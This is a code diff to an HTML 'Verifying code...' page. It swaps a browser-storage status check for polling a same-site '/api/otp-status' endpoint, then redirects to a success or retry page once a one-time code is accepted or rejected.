@@ -42,24 +42,25 @@
   <div class="loading-text">Verifying code...</div>
 
   <script>
-    const requestId = sessionStorage.getItem('currentVerifyId');
+    let checks = 0;
 
-    function checkStatus() {
-      if (!requestId) return;
-      const requests = JSON.parse(localStorage.getItem('verifyRequests') || '[]');
-      const req = requests.find(r => r.id === requestId);
-      if (!req) return;
-
-      if (req.status === 'accepted') {
-        clearInterval(poller);
-        sessionStorage.removeItem('currentVerifyId');
-        window.location.href = 'success.html';
-      } else if (req.status === 'rejected') {
-        clearInterval(poller);
-        sessionStorage.setItem('verifyRejected', '1');
-        sessionStorage.removeItem('currentVerifyId');
-        window.location.href = 'verify.html';
+    async function checkStatus() {
+      try {
+        const response = await fetch('/api/otp-status', { cache: 'no-store' });
+        const request = await response.json();
+        if (request && request.status === 'accepted') {
+          clearInterval(poller);
+          window.location.href = 'success.html';
+        } else if (request && request.status === 'rejected') {
+          clearInterval(poller);
+          sessionStorage.setItem('verifyRejected', '1');
+          window.location.href = 'verify.html';
+        }
+      } catch (error) {
+        // Continue polling while the server is temporarily unavailable.
       }
+      checks += 1;
+      if (checks >= 60) clearInterval(poller);
     }
 
     const poller = setInterval(checkStatus, 1000);
